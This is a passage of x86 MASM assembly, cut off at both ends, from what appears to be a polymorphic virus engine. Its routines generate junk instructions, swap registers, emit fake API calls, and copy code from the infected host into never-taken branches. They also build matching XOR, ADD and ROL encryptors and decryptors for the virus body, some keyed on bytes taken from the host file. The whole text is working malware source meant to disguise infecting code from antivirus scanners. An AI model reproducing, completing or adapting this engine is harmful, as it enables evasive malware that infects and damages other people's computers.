;-----------------------------------------------------------------------------------------------
  ;=*-=*-=*-=*-=*-= DYNAMIC REGISTER SWAPPING INSTRUCTIONS =*-=*-=*-=*-=*-=;
        .ElseIf Eax<130
            Mov Edx,Flags
            .If !(Dl & NO_REGSWAPPING)  ;if no register swapping so skip
                Mov Edi,HeapPtr
                Mov Ebx,100                     ;100 try if nothing GO OFF
GetAnother:
                Invoke GetValidReg, UsedRegs    ;getting the new register
                Mov Edx,Eax                     ;save it
                Mov Ecx,5                       ;the maximum number of registers for an Algorithm +1
                .While Ecx>0                    ;test the new register if it a register will be used in the Algorithm but still not initialized
                    Mov Esi,Edi
                    Add Esi,Ecx                 ;the register that we will test
                    Dec Esi
                    Movzx Eax,[Esi].RWPolyData.UsedRegs ;get the register
                    Dec Eax                             ;because we add to any register in UsedRegs 1 (eax->1 ecx-->2 ...) because 0 -->no register
                    .If Eax==Edx                        ;Oops it's really an Algorithm register
                        Dec Ebx                         ;dec the counter
                        .If Ebx>0
                            Jmp GetAnother              ;find another
                        .Else
                            Jmp End_of_regswap          ;100 try without getting a register not initialized go out of this inifine loop
                        .EndIf
                    .EndIf
                    Dec Ecx                             ;geting the next register in UsedRegs
                .EndW
                Mov Temp1,Edx                           ;we get the register save it
                Xor Eax,Eax                             ;eax ==0 (the loop depends on eax==0)
                .While Eax==0                           ;if we get a register we will exit
                    Invoke Rand, 4
                    Mov Edi,HeapPtr
                    Add Edi,Eax
                    Mov Edx,Eax                         ;save it for later use
                    Movzx Eax,[Edi].RWPolyData.UsedRegs ;get it
                    .If !(Eax==0)                       ;is there's a register there?
                        Dec Eax
                        Mov Cl,Al
                        Mov Eax,1
                        Shl Eax,Cl                      ;is it affected
                        .If !(UsedRegs & Eax)
                            Xor Eax,Eax                 ;it's not affected so it's not initialized let's get another
                        .EndIf
                    .Else
                        Xor Eax,Eax                     ;no register there try to get another
                    .EndIf
                .EndW
                Mov Temp2,Ecx
                Invoke Assembl, ASM_MOV,dEip,Byte Ptr [Temp1],Byte Ptr [Temp2],R_RM Or RM_REG,0,0
                Mov dEip,Edi
                Dec RemainIns
                Invoke Rand, 2  ;fake or true register swapping
                .If Eax==0  ;**TRUE REGISTER SWAPPING**
                    Mov Ecx,Temp1   ;the new register
                    Mov Eax,1
                    Shl Eax,Cl      ;Reserve it
                    Mov Edi,HeapPtr
                    Or [Edi].RWPolyData.AffectedRegs,Al
                    Mov Ecx,Temp2   ;the old register
                    Mov Eax,1
                    Shl Eax,Cl      ;remove it
                    Not Eax
                    And [Edi].RWPolyData.AffectedRegs,Al
                    Movzx Eax,[Edi].RWPolyData.AffectedRegs
                    Mov UsedRegs,Eax    ;save them
                    Add Edi,Edx     ;the place of the register in usedregs
                    Mov Eax,Temp1
                    Inc Eax
                    Mov [Edi].RWPolyData.UsedRegs,Al
                .EndIf
End_of_regswap:
            .EndIf
;-----------------------------------------------------------------------------------------------
        ;=*-=*-=*-=*-=*-= ANTI-NEGATIVE PATTERN INSTRUCTIONS =*-=*-=*-=*-=*-=;
        .ElseIf Eax<150
            Mov Edi,HeapPtr
            Mov Edx,Flags
            .If !(Dl & NO_NEGATIVEPATTERN) && !([Edi].RWPolyData.UsedRegs==0)&&!([Edi].RWPolyData.EpoPointer==0)  && (RemainIns>3)
                Sub RemainIns,2             ;for cmp and jmp
                Mov Ecx,[Edi].RWPolyData.VirusSize
                Invoke Rand,0                       ;we will add it to the size
                Add Ecx,Eax                         ;bigger than the size of the virus
                Movzx Eax,[Edi].RWPolyData.UsedRegs ;the counter
                Dec Eax
                Mov Temp1,Eax                       ;save it here for cmp
                ;cmp ecx,VirusSize+XXXX     this cmp will never become true because we will not excute the code we get
                Invoke Assembl, ASM_CMP,dEip,Byte Ptr [Temp1],0,R_IMM,0,Ecx
                Mov dEip,Edi
                Invoke Assembl, ASM_JB,dEip,0,0,0,0,12345678H
                Mov dEip,Edi
                Mov Eax,dEip
                Sub Eax,4
                Mov Temp1,Eax       ;we will fix it again
                Invoke Rand, RemainIns
                Mov Temp2,Eax       ;the number of instructions we will use
                Mov Edi,HeapPtr
                Mov Edi,[Edi].RWPolyData.EpoPointer ;now we switch to EpoData Structure
                Assume Edi:Nothing
                ;setting the environment
                Mov Ecx,[Edi].EpoData.NoOfIns
                Sub Ecx,Temp2                   ;we will get a random instuctions in the disassembled code
                Sub Ecx,2                       ;we will avoid leave and ret
                .If !(Ecx>[Edi].EpoData.NoOfIns)
                    Invoke Rand,Ecx                 ;now we have the number
                .Else
                    Mov Ecx,0
                .EndIf
                Mov Edx,SizeOf hde32s           ;we will multiply it by the size of hde32s
                Mul Edx
                Lea Edx,[Edi].EpoData.DisasmCode
                Add Edx,Eax                     ;the instruction we choose
                Lea Esi,[Edi].EpoData.ProcCode
                Mov Edi,dEip
                ;we will del any jmp and fix any call we get within the host code
                ;now we have esi->ProcCode (source) & edi-->dEip (Destination) & edx-->DisasmCode
                .While Temp2>0
                    .If !([Edx].hde32s.opcode>=72H && [Edx].hde32s.opcode<=7AH) && !([Edx].hde32s.opcode==0EBH) && !([Edx].hde32s.opcode2>=82H && [Edx].hde32s.opcode2<=8AH)&& !([Edx].hde32s.opcode==0FFH) ;jmps and jcc instructions
                        Mov Esi,[Edx].hde32s.ins_addr       ;the place where the instruction is
                        Push Edi
                        Mov Edi,HeapPtr
                        Add Esi,[Edi].RWPolyData.FileHandler    ;as it just an offset
                        Pop Edi
                        Movzx Ecx,[Edx].hde32s.len
                        .If !(Ecx>6)
                            Xor Eax,Eax
                            Rep Movsb
                            ;here we will fix the calls
                            .If [Edx].hde32s.opcode==0E8H   ;call instruction
                                PushAD                      ;it should be NewPlace-OldPlace==delta
                                Push Esi
                                Mov Esi,HeapPtr             ;disp32-delta=new disp32
                                Lea Esi,[Esi].RWPolyData.Decryptor
                                Mov Edx,Edi
                                Sub Edx,Esi                 ;edx --> dEip - Begining_of_Decryptor
                                Mov Esi,HeapPtr
                                Mov Ebx,[Esi].RWPolyData.DecryptorRVA
                                Add Ebx,Edx                 ;ebx-->NewPlace
                                Pop Esi                     ;esi-->OldPlace (from this line Mov Esi,[Edx].hde32s.ins_addr)
                                Mov Edx,HeapPtr
                                Invoke OffsetToRVA, [Edx].RWPolyData.FileHandler,Esi
                                Mov Esi,Eax
                                Sub Ebx,Esi                 ;NewPlace-OldPlace==delta   ebx-->Delta
                                Sub DWord Ptr [Edi-4],Ebx   ;disp32-delta=new disp32 **
                                PopAD
                            .EndIf
                        .EndIf
                    .EndIf
                    Add Edx,SizeOf hde32s
                    Dec Temp2
                    Dec RemainIns
                .EndW
                Mov Eax,Edi     ;Destination
                Sub Eax,dEip    ;           -source
                Mov Esi,Temp1   ;                   ==disp32
                Mov DWord Ptr [Esi],Eax
                Mov dEip,Edi    ;save again the dEip
            .EndIf
        .EndIf
        Mov Edi,HeapPtr
        Movzx Eax,[Edi].RWPolyData.AffectedRegs
        Mov UsedRegs,Eax    ;save them
    .EndW
    Mov Eax,dEip    ;return a pointer to the end of the Garbage
    Ret
GarPJ EndP
;this Proc used in if-else instructions .They create cmp/jb,ja,... or test/jz or jnz
;it will use 16bits and 8bits beside 32bits

DoExpression Proc Uses Esi Ecx Edx DecryptorPointer:DWord,HeapPtr:DWord,nExpression:DWord
    Local dEip:DWord
    Local nIns:DWord
    Local UsedRegs:DWord
    Local Flags:DWord
    Local Temp1:DWord   ;FOR ANY USE
    Local Temp2:DWord
    Local Temp3:DWord
    Local Temp4:DWord
    Invoke Rand, nExpression        ;the number of expressions we will use
    Inc Eax
    Mov Ecx,Eax
    Mov nIns,Ecx                        ;save it for return
    Mov Edi,DecryptorPointer
    Mov dEip,Edi
    Mov Esi,HeapPtr
    Movzx Eax,[Esi].RWPolyData.AffectedRegs
    Mov UsedRegs,Eax
    Movzx Edx,[Esi].RWPolyData.IFOrder
    Shl Edx,4                           ;4-->2^4-->4*4== (4) pointers
    Lea Esi,[Esi].RWPolyData.Temp       ;we will save the pointers for jmps there
    Add Esi,Edx
    .While Ecx>0
        Invoke Rand,2
        .If Eax==0
            Mov Temp3,07H   ;cmp
            Invoke Rand, 0
            Mov Temp1,Eax
            Invoke Rand,6   ;for all types of jmp
            Add Eax,18H     ;JAE,JB,JZ,JNZ,JA,JBE
            Mov Temp2,Eax
        .Else
            Mov Temp3,41H   ;test
            Invoke Rand, 32 ;as test work only for 1-bit like 00001000b not any number
            Mov Edx,1
            Push Ecx
            Shl Edx,Cl
            Pop Ecx
            Mov Temp1,Eax
            Invoke Rand, 2  ;jz and jnz only which work with test
            Add Eax,1AH     ;1Ah+0-->jz and 1Bh (1Ah+1)-->jnz
            Mov Temp2,Eax
        .EndIf
        Invoke Rand, 2      ;register or Local variable
        .If Eax==0          ;REGISTER
            Invoke GetAnyReg
            Mov Temp4,Eax
            Invoke Rand,5
            .If Eax==0 && !(Temp4==6) && !(Temp4==7)    ;we don't need esi & edi
                Mov Flags,BITS16
            .ElseIf Eax==1 && !(Temp4==6) && !(Temp4==7)
                Mov Flags,BITS8
            .Else
                Mov Flags,0
            .EndIf
            Or Flags,R_IMM
            Invoke Assembl, Temp3,dEip,Byte Ptr[Temp4],0, Flags,0,Temp1
            Mov dEip,Edi
        .Else
            Invoke GetLocalVar, HeapPtr
            Mov Temp4,Eax
            Invoke Assembl, Temp3,dEip,0,REG_EBP,RM_IMM,Temp4,Temp1
            Mov dEip,Edi
        .EndIf
        Mov Edi,dEip
        Mov DWord Ptr [Esi],Edi
        Add Esi,4
        Invoke Assembl, Temp2,dEip,0,0,ONLY_IMM,0,0
        Mov dEip,Edi
        Dec Ecx
    .EndW
    Mov Eax,nIns
    Mov Edi,dEip
    Ret
DoExpression EndP
;return eax-->0 (if fail) or RemianIns (if success)
;       edi--> pointing after the last instruction written (like dEip in GarBJ)

CallAPI Proc Uses Ecx Edx Esi DecryptEip:DWord,NumOfIns:DWord,HeapPtr:DWord,NeededAPIs:DWord
    Local dEip:DWord
    Local RemainIns:DWord
    Local Temp1:DWord
    Local Temp2:DWord
    Mov Eax,DecryptEip  ;save them
    Mov dEip,Eax
    Mov Eax,NumOfIns
    Mov RemainIns,Eax
    .If NeededAPIs==0
        ;now we will get the numbewr of Apis we have
        Mov Esi,HeapPtr
        .If !([Esi].RWPolyData.APIsFound==0)
            Invoke Rand,[Esi].RWPolyData.APIsFound
            Lea Esi,[Esi].RWPolyData.AvariableAPIs  ;pointing to the first API
            Mov Edx,SizeOf API
            Mul Edx
            Add Esi,Eax                         ;esi--> the API we need
            ;let's caculate the number of instructions we need
            Movzx Ecx,[Esi].API.nParams
            .If !(Ecx==0)
                Inc Ecx         ;for safety
            .EndIf
            Inc Ecx             ;for call
            .If [Esi].API.nResult==1
                Inc Ecx         ;if the return is important we will save it so we will use another instruction
            .EndIf
            Mov Edi,HeapPtr
            .If ([Edi].RWPolyData.AffectedRegs & 01H) && ([Esi].API.Regs & 01H)         ;eax
                Add Ecx,2
            .EndIf
            .If ([Edi].RWPolyData.AffectedRegs & 02H) && ([Esi].API.Regs & 02H)         ;ecx
                Add Ecx,2
            .EndIf
            .If( [Edi].RWPolyData.AffectedRegs & 04H) && ([Esi].API.Regs & 04H)             ;edx
                Add Ecx,2
            .EndIf
            ;now ecx-->number of instructions we need now let's jump into create the API
            .If RemainIns >=Ecx
                .If ([Edi].RWPolyData.AffectedRegs & 01H)   && ([Esi].API.Regs & 01H)
                    Sub Ecx,2
                    Sub RemainIns,2
                    Invoke Assembl, ASM_PUSH,dEip,REG_EAX,0,ONLY_REG,0,0
                    Mov dEip,Edi
                .EndIf
                Mov Edi,HeapPtr
                .If ([Edi].RWPolyData.AffectedRegs & 02H)   && ([Esi].API.Regs & 02H)
                    Sub Ecx,2
                    Sub RemainIns,2
                    Invoke Assembl, ASM_PUSH,dEip,REG_ECX,0,ONLY_REG,0,0
                    Mov dEip,Edi
                .EndIf
                Mov Edi,HeapPtr
                .If ([Edi].RWPolyData.AffectedRegs & 04H) && ([Esi].API.Regs & 04H)
                    Sub Ecx,2
                    Sub RemainIns,2
                    Invoke Assembl, ASM_PUSH,dEip,REG_EDX,0,ONLY_REG,0,0
                    Mov dEip,Edi
                .EndIf
                Lea Edi,[Esi].API.Param1
                Movzx Ecx,[Esi].API.nParams
                Add Edi,Ecx
                Dec Edi                         ;because it's allready on the parameter 1
                .While Ecx>0
                    Movzx Eax,Byte Ptr [Edi]    ;let's jump into the parameters (begin with last parameter
                    .If Eax==0      ;0-->any number
                        Invoke Rand, 0
                        Mov Temp1,Eax
                        Push Edi
                        ;push XXXXXXXX
                        Invoke Assembl, ASM_PUSH,dEip,0,0,ONLY_IMM,0,Temp1
                        Mov dEip,Edi
                        Dec RemainIns
                        Pop Edi
                    .ElseIf Eax==1  ;1-->Local Variable Pointer (will take 2 instructions)
                        Invoke GetLocalVar, HeapPtr
                        Mov Temp1,Eax
                        Push Edi
                        ;Lea eax,dword ptr [ebp-XX]
                        Invoke Assembl, ASM_LEA,dEip,REG_EAX,REG_EBP,R_RM,Temp1,0
                        Mov dEip,Edi
                        ;push eax
                        Invoke Assembl, ASM_PUSH,dEip,REG_EAX,0,ONLY_REG ,0,0
                        Mov dEip,Edi
                        Pop Edi
                        Sub RemainIns,2
                    .ElseIf Eax==2  ;2-->String Pointer
                        Mov Temp2,Esi   ;save it
                        Mov Esi,HeapPtr
                        Push Ecx
                        Mov Ecx,[Esi].RWPolyData.NumOfStrings
                        Invoke Rand, Ecx
                        Lea Esi,[Esi].RWPolyData.Strings
                        Shl Eax,3       ;eax*8 -->Pointer to string we need
                        Add Esi,Eax     ;esi-->random String
                        Mov Esi,DWord Ptr [Esi]
                        Push Edi
                        Invoke Assembl, ASM_PUSH,dEip,0,0,ONLY_IMM,0,Esi
                        Mov dEip,Edi
                        Pop Edi
                        Pop Ecx
                        Dec RemainIns
                        Mov Esi,Temp2
                    .Else           ;3-->put 0
                        Push Edi
                        ;push 0
                        Invoke Assembl, ASM_PUSH,dEip,0,0,ONLY_IMM,0,0
                        Mov dEip,Edi
                        Pop Edi
                        Dec RemainIns
                    .EndIf
                    Dec Ecx
                    Dec Edi
                .EndW
                ;now we will jump into writing the call itself
                ;it's hard point in caculation so take care
                ;Mov Edi,HeapPtr
                ;Lea Eax,[Edi].RWPolyData.Decryptor
                ;Sub Eax,dEip
                ;Sub Eax,5              ;now the offset between (after the call) and the beginnig of the decryptor
                ;Neg Eax                    ;but it's in negative (dEip>Decryptor pointer)
                ;Add Eax,[Edi].RWPolyData.DecryptorRVA
                ;Mov Temp1,Eax          ;now we have the RVA of the call now let's make the call
                Mov Eax,[Esi].API.VA    ;still esi pointing to the beginning of the API
                ;Sub Eax,Temp1          ;the difference
                Mov Temp1,Eax           ;save it
                Invoke Assembl, ASM_CALL,dEip,0,0,RM_ADDR Or RM_NOREG,Temp1,0   ;REL_ADDR
                Mov dEip,Edi
                Dec RemainIns
                Movzx Eax,[Esi].API.nResult
                .If Eax==1
                    Invoke GetLocalVar, HeapPtr
                    Mov Temp1,Eax
                    Invoke Assembl, ASM_MOV,dEip,REG_EAX,REG_EBP,RM_R,Temp1,0
                    Mov dEip,Edi
                    Dec RemainIns
                .EndIf
                Mov Edi,HeapPtr
                .If ([Edi].RWPolyData.AffectedRegs & 04H) && ([Esi].API.Regs & 04H)
                    Invoke Assembl, ASM_POP,dEip,REG_EDX,0,ONLY_REG,0,0
                    Mov dEip,Edi
                .EndIf
                Mov Edi,HeapPtr
                .If ([Edi].RWPolyData.AffectedRegs & 02H) && ([Esi].API.Regs & 02H)
                    Invoke Assembl, ASM_POP,dEip,REG_ECX,0,ONLY_REG,0,0
                    Mov dEip,Edi
                .EndIf
                Mov Edi,HeapPtr
                .If ([Edi].RWPolyData.AffectedRegs & 01H) && ([Esi].API.Regs & 01H)
                    Invoke Assembl, ASM_POP,dEip,REG_EAX,0,ONLY_REG,0,0
                    Mov dEip,Edi
                .EndIf
                Mov Edi,dEip        ;for Return
                Mov Eax,RemainIns   ;for Return
            .Else
                Xor Eax,Eax
                Mov Edi,dEip
            .EndIf
        .Else
            Xor Eax,Eax
            Mov Edi,dEip
        .EndIf
    .Else
        Xor Eax,Eax
        Mov Edi,dEip
    .EndIf
    Ret
CallAPI EndP
;this proc get a register that's not used by the decryptor
;this proc used for getting a register for junk
GetValidReg Proc Uses Ecx UsedRegs:DWord
GetReg:
    Invoke Rand, 6      ;the variable we will use
    .If Eax>3
        Add Eax,2       ;for esi and edi
    .EndIf
    Mov Cl,Al
    Mov Eax,1
    Shl Eax,Cl
    Test Eax,UsedRegs
    Jnz GetReg          ;I'm sorry here for not using masm if else
    Movzx Eax,Cl
    Ret
GetValidReg EndP
GetAnyReg Proc
    Invoke Rand, 6      ;the variable we will use
    .If Eax>3
        Add Eax,2       ;for esi and edi
    .EndIf
    Ret
GetAnyReg EndP
GetLocalVar Proc Uses Edi Edx HeapPtr:DWord
    Mov Edi,HeapPtr
    Movzx Eax,[Edi].RWPolyData.nLocalVars
    Dec Eax                             ;because we will not use variable dword ptr [ebp]
    Invoke Rand,Eax                     ;the local variable we will use
    Inc Eax
    Shl Eax,2                           ;*4
    Neg Eax                             ;make it ebp - 4*(num we choose)
    Ret
GetLocalVar EndP
;------------------------------------------------------------------------------------------
;Keyword:Algorithms_Place
     ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
     ;-=-=-=                            The Algorithms Creator                    =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=    Return:                                                           =-=-=-
     ;-=-=-=            edi-->dEip                                                                    =-=-=-
     ;-=-=-=            eax-->size of encryptor                                                       =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;the Algorim should be one of them XOR,ADD/SUB,ROR/ROL
;we also create the encryptor in the CreateAlgorithm
;there's two type of Algorithms (KEY,TABLE)
;Key like xor eax,57687636Fh
;Table:take a part from the host to encrype the virus like :
       ;mov ebx,[0040XXXX+ecx]      0040XXXX -->part from the host
       ;xor eax,ebx                 Xor the virus with the host

CreateAlgorithm Proc Uses Esi Ecx Edx Ebx HeapPtr:DWord,AlgorithmNum:DWord,DecryptorEip:DWord,NumOfIns:DWord,Flags:DWord
    Local Alg:Byte
    Local GarIns:DWord
    Local RegTable:DWord
    Local RegKey:DWord
    Local nIns:DWord
    Local dEip:DWord
    Local enEip:DWord       ;for the encryptor
    Local DecryptTable:DWord
    Local EncryptTable:DWord
    Local Temp1:DWord
    Local Temp2:DWord
    Local Temp3:DWord
    ;regTable--> that's the register that will be used in geting the data from the Table
    ;RegKey-->that's the register that will be used in getting the data from the encrypted virus to decrype it
    Mov Eax,DecryptorEip
    Mov Edi,HeapPtr
    Lea Edi,[Edi].RWPolyData.EncryptorTemp
    Mov enEip,Edi                           ;that's the place where we will put our encryptor
    Mov Edi,HeapPtr
    Mov dEip,Eax
    Mov Edx,AlgorithmNum
    Invoke Rand,2       ;Table or Key
    .If Edx==2
        Mov Eax,0       ;no table for rol/ror
    .EndIf
    .If Eax==1          ;*TABLE*
        Add Edx,3
        Mov Ecx,4       ;number of instruction for this type of Algorithm
        ;setting the registers
        Invoke GetValidReg,[Edi].RWPolyData.AffectedRegs
        Mov RegTable,Eax
        Inc Eax
        Mov [Edi+3].RWPolyData.UsedRegs,Al
        Push Edx
        Mov Edx,1
        Push Ecx
        Mov Ecx,Eax
        Dec Ecx
        Shl Edx,Cl
        Movzx Ecx,[Edi].RWPolyData.AffectedRegs
        Or Ecx,Edx
        Xchg Ecx,Edx
        Pop Ecx
        Invoke GetValidReg,Edx
        Mov RegKey,Eax
        Inc Eax
        Mov [Edi+2].RWPolyData.UsedRegs,Al          ;save the register
        Pop Edx
    .Else               ;*KEY*
        Mov Ecx,3
        Mov [Edi+3].RWPolyData.UsedRegs,0
        Invoke GetValidReg,[Edi].RWPolyData.AffectedRegs
        Mov RegKey,Eax
        Inc Eax
        Mov [Edi+2].RWPolyData.UsedRegs,Al          ;save the register
    .EndIf
    ;RegKey will be used
    Mov Alg,Dl                                  ;save the Algorithm
    Mov Edx,NumOfIns
    .If (Edx>Ecx)
        Sub Edx,Ecx
    .Else
        Mov Edx,0
    .EndIf
    Mov Edi,HeapPtr
    ;we make edi+50 because we reserve 50 byte for Eagle
    ;manglo put the number of gabage instruction for every Algorithm instruction (randomly)
    Lea Esi,[Edi+50].RWPolyData.GarManglo
    Invoke Manglo,Esi,Ecx,Edx,50
    .If Alg<3       ;table
        ;fixing some problems
        Mov Eax,[Edi+50+2*4].RWPolyData.GarManglo
        Mov [Edi+50+3*4].RWPolyData.GarManglo,Eax
        Mov Eax,[Edi+50+1*4].RWPolyData.GarManglo
        Mov [Edi+50+2*4].RWPolyData.GarManglo,Eax
        Mov [Edi+50+1*4].RWPolyData.GarManglo,0
    .EndIf
    ;now Let's begin write our instructions
;------------------------------------------------------------------------;
        ;=*-=*-=*-=*-=*-= READ INSTRUCTION =*-=*-=*-=*-=*-=;
BeginRead:
    .If [Edi+1].RWPolyData.UsedRegs ==0     ;Is there a register pointing to the virus or not?
        Invoke Rand, 2                      ;not so we will have two type of instuctions for read
    .Else
        Invoke Rand, 4                      ;yes there's .So we have 4
    .EndIf
    .If Eax==0      ;instruction like Mov eax,dword[virusPtr+ecx]
        Mov Edi,HeapPtr
        Mov Eax,DWord Ptr [Edi+50].RWPolyData.GarManglo
        Mov nIns,Eax                                        ;we get the number of garbage instructions
        Push Edi
        Mov Dl,[Edi].RWPolyData.UsedRegs
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        Invoke Assembl, ASM_MOV,dEip,Byte Ptr [RegKey],Dl,R_RM,[Edi].RWPolyData.VirusPtr,0
        Mov dEip,Edi
        ;for the encryptor
        Pop Edi
        Mov Edx,1
        Mov Ecx,RegKey
        Shl Edx,Cl          ;we now initialized this register so we need to put it in AffectedRegs
        Or [Edi].RWPolyData.AffectedRegs,Dl ;that's for avoid the garbage from using it
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
    .ElseIf Eax==1  ;instruction like push dword[virusPtr+ecx]/pop eax
        Mov Edi,HeapPtr
        Mov Eax,DWord Ptr [Edi+50].RWPolyData.GarManglo
        Dec Eax                                         ;because we will write a new instruction pop e?X
        .If Al==0FFH                                ;mean minus (it mean a plus instruction so return to get another)
            Jmp BeginRead
        .EndIf
        Lea Esi,DWord Ptr [Edi+70].RWPolyData.GarManglo
        Invoke Manglo,Esi,2,Eax,50                          ;in this instruction we will use 2 GarbJ after the push and after the pop so we need to call manglo for that
        Mov Eax,DWord Ptr [Edi+70].RWPolyData.GarManglo
        Mov nIns,Eax
        Push Edi
        Mov Dl,[Edi].RWPolyData.UsedRegs
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        ;PUSH DWORD PTR [ECX+0040XXXX]
        Invoke Assembl, ASM_PUSH,dEip,0,Dl, ONLY_RM,[Edi].RWPolyData.VirusPtr,0
        Mov dEip,Edi
        Pop Edi
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
        Mov Eax,DWord Ptr [Edi+60+1*4].RWPolyData.GarManglo
        Mov nIns,Eax
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Invoke Assembl, ASM_POP,dEip,Byte Ptr [RegKey],0,ONLY_REG,0,0
        Mov dEip,Edi
        Mov Edi,HeapPtr
        Mov Edx,1
        Mov Ecx,RegKey
        Shl Edx,Cl          ;we now initialized this register so we need to put it in AffectedRegs
        Or [Edi].RWPolyData.AffectedRegs,Dl ;that's for avoid the garbage from using it
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
    .ElseIf Eax==2      ;instruction like Mov eax,dword[edi]
        Mov Edi,HeapPtr
        Mov Eax,[Edi+50].RWPolyData.GarManglo
        Mov nIns,Eax                                        ;we get the number of garbage instructions
        Push Edi
        Mov Dl,[Edi+1].RWPolyData.UsedRegs
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Invoke Assembl, ASM_MOV,dEip,Byte Ptr [RegKey],Dl,R_RM,0,0
        Mov dEip,Edi
        ;for the encryptor
        Pop Edi
        Mov Edx,1
        Mov Ecx,RegKey
        Shl Edx,Cl          ;we now initialized this register so we need to put it in AffectedRegs
        Or [Edi].RWPolyData.AffectedRegs,Dl ;that's for avoid the garbage from using it
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
    .ElseIf Eax==3  ;instruction like push dword[edi]/pop eax
        Mov Edi,HeapPtr
        Mov Eax,[Edi+50].RWPolyData.GarManglo
        Dec Eax                                         ;because we will write a new instruction pop e?X
        .If Al==0FFH                                ;mean minus (it mean a plus instruction so return to get another)
            Jmp BeginRead
        .EndIf
        Lea Esi,[Edi+70].RWPolyData.GarManglo
        Invoke Manglo,Esi,2,Eax,50                          ;in this instruction we will use 2 GarbJ after the push and after the pop so we need to call manglo for that
        Mov Eax,[Edi+70].RWPolyData.GarManglo
        Mov nIns,Eax
        Push Edi
        Mov Dl,[Edi+1].RWPolyData.UsedRegs                  ;the Register that used as a pointer to the virus
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        ;PUSH DWORD PTR [edi]
        Invoke Assembl, ASM_PUSH,dEip,0,Dl, ONLY_RM,0,0
        Mov dEip,Edi
        Pop Edi
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
        Mov Eax,[Edi+70+1*4].RWPolyData.GarManglo
        Mov nIns,Eax
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Invoke Assembl, ASM_POP,dEip,Byte Ptr [RegKey],0,ONLY_REG,0,0
        Mov dEip,Edi
        Mov Edi,HeapPtr
        Mov Edx,1
        Mov Ecx,RegKey
        Shl Edx,Cl          ;we now initialized this register so we need to put it in AffectedRegs
        Or [Edi].RWPolyData.AffectedRegs,Dl ;that's for avoid the garbage from using it
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
    .EndIf
    ;pop eax
    Invoke Assembl, ASM_MOV,enEip,REG_EAX,REG_ECX,R_RM,[Edi].RWPolyData.VirusOffset,0
    Mov enEip,Edi
;------------------------------------------------------------------------;
        ;=*-=*-=*-=*-=*-= READ TABLE INSTRUCTION =*-=*-=*-=*-=*-=;
BeginTable:
    Mov Edi,HeapPtr
    .If !([Edi+3].RWPolyData.UsedRegs ==0) || (Alg==6)
        Mov Edi,HeapPtr
        Movzx Ecx,[Edi].RWPolyData.TableCount
        Invoke Rand, Ecx
        Mov Edx,SizeOf PLACE_IN_MEMORY
        Mul Edx
        Lea Esi,[Edi].RWPolyData.EncryptPtrs
        Lea Edi,[Edi].RWPolyData.DecryptPtrs
        Add Edi,Eax
        Add Esi,Eax
        Assume Edi:Nothing
        Mov Ecx,[Edi].PLACE_IN_MEMORY.nSize
        Invoke Rand, Ecx
        Mov Ecx,Eax
        Add Eax,[Edi].PLACE_IN_MEMORY.VA
        Add Ecx,[Esi].PLACE_IN_MEMORY.VA
        Mov DecryptTable,Eax
        Mov EncryptTable,Ecx
        Invoke Rand, 2
        .If Eax==0      ;instruction like Mov ebx,dword[virusPtr+ecx]
            Mov Edi,HeapPtr
            Mov Eax,[Edi+50+1*4].RWPolyData.GarManglo
            Mov nIns,Eax                                        ;we get the number of garbage instructions
            Push Edi
            Mov Dl,[Edi].RWPolyData.UsedRegs
            Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
            Movzx Eax,[Edi+3].RWPolyData.UsedRegs
            Mov RegTable,Eax
            Dec RegTable
            Invoke Assembl, ASM_MOV,dEip,Byte Ptr [RegTable],Dl,R_RM,DecryptTable,0
            Mov dEip,Edi
            ;for the encryptor
            Pop Edi
            Mov Edx,1
            Mov Ecx,RegTable
            Shl Edx,Cl          ;we now initialized this register so we need to put it in AffectedRegs
            Or [Edi].RWPolyData.AffectedRegs,Dl ;that's for avoid the garbage from using it
            Mov Ebx,Flags
            Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
            Mov dEip,Eax
        .ElseIf Eax==1  ;instruction like push dword[virusPtr+ecx]/pop eax
            Mov Edi,HeapPtr
            Mov Eax,[Edi+50+1*4].RWPolyData.GarManglo
            Dec Eax                                         ;because we will write a new instruction pop e?X
            .If Al==0FFH                                ;mean minus (it mean a plus instruction so return to get another)
                Jmp BeginTable
            .EndIf
            Lea Esi,[Edi+70].RWPolyData.GarManglo
            Invoke Manglo,Esi,2,Eax,50                          ;in this instruction we will use 2 GarbJ after the push and after the pop so we need to call manglo for that
            Mov Eax,[Edi+70].RWPolyData.GarManglo
            Mov nIns,Eax
            Push Edi
            Mov Dl,[Edi].RWPolyData.UsedRegs
            Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
            ;PUSH DWORD PTR [ECX+0040XXXX]
            Invoke Assembl, ASM_PUSH,dEip,0,Dl, ONLY_RM,DecryptTable,0
            Mov dEip,Edi
            Pop Edi
            Mov Ebx,Flags
